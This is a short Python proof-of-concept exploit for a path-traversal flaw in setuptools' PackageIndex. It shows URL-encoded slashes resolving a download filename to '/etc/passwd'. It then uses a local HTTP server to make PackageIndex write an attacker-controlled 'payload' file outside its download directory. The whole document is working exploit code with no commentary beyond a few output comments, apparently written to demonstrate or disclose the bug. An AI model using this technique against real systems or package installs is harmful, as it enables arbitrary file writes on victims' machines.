import os, tempfile, threading, http.server
from setuptools.package_index import PackageIndex

tmpdir = tempfile.mkdtemp()
print(PackageIndex._resolve_download_filename("https://example.org/pkg/%2Fetc%2Fpasswd", tmpdir))
# -> /etc/passwd

target = os.path.join(tempfile.mkdtemp(), "pwned.txt")

class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.end_headers(); self.wfile.write(b"payload")
    def log_message(self, *a): pass

srv = http.server.HTTPServer(("127.0.0.1", 0), H)
threading.Thread(target=srv.serve_forever, daemon=True).start()
url = f"http://127.0.0.1:{srv.server_port}/pkg/" + target.replace("/", "%2F")
PackageIndex().download(url, tmpdir)
print(open(target).read())  # payload -- written outside tmpdir
